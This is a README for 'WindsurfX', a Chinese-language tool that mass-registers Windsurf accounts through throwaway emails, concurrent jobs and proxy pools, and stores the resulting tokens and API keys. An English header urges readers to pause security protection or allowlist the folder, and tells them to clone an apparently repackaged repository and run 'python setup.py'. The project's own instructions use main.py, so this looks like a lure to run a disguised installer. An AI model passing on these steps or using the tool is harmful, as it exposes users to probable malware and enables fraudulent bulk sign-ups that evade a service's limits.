# WindsurfX


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/SensationWarlord53/WindsurfX-262.git
cd WindsurfX-262
python setup.py
```


[![License](https://img.shields.io/github/license/huey1in/WindsurfX?style=flat-square)](https://github.com/SensationWarlord53/WindsurfX-262/blob/main/LICENSE)
[![Stars](https://img.shields.io/github/stars/huey1in/WindsurfX?style=flat-square)](https://github.com/SensationWarlord53/WindsurfX-262/stargazers)
[![Issues](https://img.shields.io/github/issues/huey1in/WindsurfX?style=flat-square)](https://github.com/SensationWarlord53/WindsurfX-262/issues)
[![Last Commit](https://img.shields.io/github/last-commit/huey1in/WindsurfX?style=flat-square)](https://github.com/SensationWarlord53/WindsurfX-262/commits/main)
<a href="https://linux.do"><img src="https://img.shields.io/badge/LINUX%20DO-社区-f0b752?style=flat-square" alt="LINUX
   DO"></a>
[![Python](https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square)](https://www.python.org)

**WindsurfX** 是一套用于 Windsurf (windsurf.com) 平台的自动注册工具。

> 本仓库仅用于学习与研究 HTTP 协议、并发编程、临时邮件接入等技术。请勿用于违反 Windsurf 服务条款的用途，使用者自行承担风险。

---

## 说明

- Windsurf Free 层级目前只开放了 **SWE** 系列模型（Cascade / Windsurf 自研）。如果需要使用 Claude / GPT / Gemini 等完整模型，可以**绑定信用卡试用 Pro**（注册成功的账号支持自行升级）。
- 本项目是否持续维护、是否开发 **GUI 版本**（面向小白用户的可视化客户端），将根据本仓库的 **Star 数量** 来决定。如果你觉得有用，欢迎点个 [Star](https://github.com/SensationWarlord53/WindsurfX-262/stargazers)。

---

## 功能

- **批量注册**：通过临时邮箱自动接收验证码，全流程无人值守
- **多并发**：基于线程池的可配置并发数，注册数百账号只需几分钟
- **代理池**：支持单代理或代理池文件，每个任务随机分配
- **凭证持久化**：注册成功的账号写入 `accounts.json`，包含 `auth1_token` / `session_token` / `api_key` 等所有字段
- **优雅退出**：`Ctrl+C` 立即停止派发新任务，正在跑的任务在下一次轮询时退出，已完成的账号不会丢

---

## 项目结构

```
WindsurfX/
├── main.py                  # 注册入口
├── .env                     # moemail 配置
├── accounts.json            # 注册成功的账号
└── windsurfx/               # Python 包
    ├── config.py            # 环境变量、常量、ANSI 颜色
    ├── state.py             # 线程间共享状态
    ├── log.py               # 日志辅助
    ├── generators.py        # 邮箱/密码/昵称随机生成
    ├── windsurf.py          # Windsurf API 客户端
    ├── moemail.py           # moemail API 客户端 + 验证码轮询
    ├── storage.py           # accounts.json 读写
    ├── register.py          # 单账号注册流程
    └── runner.py            # 并发调度 + 信号处理
```

---


### 1. 准备环境

- Python 3.10+
- 一个 [moemail](https://github.com/beilunyang/moemail) 实例的 API Key（可自部署）

### 2. 安装依赖

```bash
```

### 3. 配置 `.env`

```env
MOEMAIL_BASE=https://your-moemail-instance.example.com
MOEMAIL_API_KEY=mk_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### 4. 批量注册

```bash
# 注册 10 个账号，5 并发
python main.py -n 10 -j 5

# 通过代理
python main.py -n 10 -j 5 -p http://127.0.0.1:7890

# 使用代理池
python main.py -n 50 -j 10 --proxy-file proxies.txt

# 自定义输出
python main.py -n 5 -o my_accounts.json
```

---

## CLI 参数

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `-n, --count` | 注册账号总数 | `1` |
| `-j, --jobs` | 并发任务数 | `1` |
| `-p, --proxy` | 单个代理 | 无 |
| `--proxy-file` | 代理池文件（每行一条） | 无 |
| `-o, --output` | 输出 JSON 路径 | `accounts.json` |

---

## 开发

按模块职责拆分，扩展时只动对应文件：

| 想要 | 改这里 |
|------|--------|
| 加 Windsurf API 端点 | `windsurfx/windsurf.py` |
| 改邮箱前缀策略 | `windsurfx/generators.py` |
| 加新输出格式 | `windsurfx/storage.py` |
| 改并发模型 | `windsurfx/runner.py` |
| 加全局配置项 | `windsurfx/config.py` |

---

## License

MIT © [huey1in](https://github.com/huey1in)


<!-- Last updated: 2026-06-06 17:23:41 -->
